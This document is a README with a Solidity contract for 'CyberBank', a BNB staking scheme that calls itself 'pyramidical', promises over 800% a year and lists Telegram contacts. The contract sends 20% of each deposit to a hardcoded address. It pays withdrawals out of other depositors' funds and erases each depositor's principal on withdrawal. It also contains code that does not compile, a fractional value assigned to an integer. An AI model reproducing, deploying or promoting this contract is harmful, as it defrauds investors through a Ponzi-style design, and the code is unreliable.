# CyberBank
A pyramidical staking BEP20 contract(BNB staking) with profit- 0.1% per hour/ 2.4% per day/ 16.8% per week/ 72% per 30 days/ 800+% per year. Dev/Creator Telegram: T.me/Da_pshen

Group of CyberBank: T.me/CyberBank

// SPDX-License-Identifier: MIT
//                           _                     _                  _
//  ___ _ __ ___   __ _ _ __| |_    ___ ___  _ __ | |_ _ __ __ _  ___| |_
// / __| '_ ` _ \ / _` | '__| __|  / __/ _ \| '_ \| __| '__/ _` |/ __| __|
// \__ \ | | | | | (_| | |  | |_  | (_| (_) | | | | |_| | | (_| | (__| |_
// |___/_| |_| |_|\__,_|_|   \__|  \___\___/|_| |_|\__|_|  \__,_|\___|\__|
//
// 
//       ███                ████    ██████  ████                     ████       █     █     █  █   █
//     ██   ██              █   █   █       █   █                    █   █     █ █    ██    █  █  █
//   ██          █       █  █    █  █       █    █                   █    █   █   █   █ █   █  █ █
//  ██            █     █   █████   ██████  █████                    █████    █   █   █  █  █  ██
//   ██            █   █    █    █  █       █ █                      █    █   █████   █   █ █  █ █ 
//     ██   ██      ███     █   █   █       █  █                     █   █   █     █  █    ██  █  █
//       ███         █      ████    ██████  █   █                    ████    █     █  █     █  █   █
//                  █
//                 █
//
//
//
pragma solidity ^0.8.0;

contract BNBHourlyReturn {
    address private constant ADDRESS_TO_RECEIVE_20 = 0x842D14221b47a39A8D03e887dDF7c35f2B6991A0;
    uint256 private constant HOURLY_PERCENTAGE = 0.1;
    uint256 private constant SECONDS_IN_HOUR = 3600;
    uint256 private constant PERCENTAGE_TO_CONTRACT = 80;
    uint256 private constant PERCENTAGE_TO_ADDRESS = 100 - PERCENTAGE_TO_CONTRACT;

    mapping(address => uint256) private depositTimestamps;
    mapping(address => uint256) private depositedAmounts;

    event Deposited(address indexed investor, uint256 amount);
    event Withdrawn(address indexed investor, uint256 amount);

    function deposit() external payable {
        require(msg.value > 0, "Amount must be greater than zero.");

        uint256 amountToContract = (msg.value * PERCENTAGE_TO_CONTRACT) / 100;
        uint256 amountToAddress = msg.value - amountToContract;

        payable(ADDRESS_TO_RECEIVE_20).transfer(amountToAddress);

        depositedAmounts[msg.sender] += amountToContract;
        depositTimestamps[msg.sender] = block.timestamp;

        emit Deposited(msg.sender, amountToContract);
    }

    function withdraw() external {
        require(depositTimestamps[msg.sender] > 0, "No deposit found for investor.");
        uint256 hoursElapsed = (block.timestamp - depositTimestamps[msg.sender]) / SECONDS_IN_HOUR;
        uint256 amountToWithdraw = (depositedAmounts[msg.sender] * HOURLY_PERCENTAGE) / 100 * hoursElapsed;

        require(amountToWithdraw <= address(this).balance, "Not enough funds in the contract");

        depositedAmounts[msg.sender] = 0;
        depositTimestamps[msg.sender] = 0;
        payable(msg.sender).transfer(amountToWithdraw);

        emit Withdrawn(msg.sender, amountToWithdraw);
    }

    // This function only allows you to check the BNB balance of the contract, not to withdraw the funds.
    function getContractBalance() external view returns(uint256) {
        return address(this).balance;
    }
}
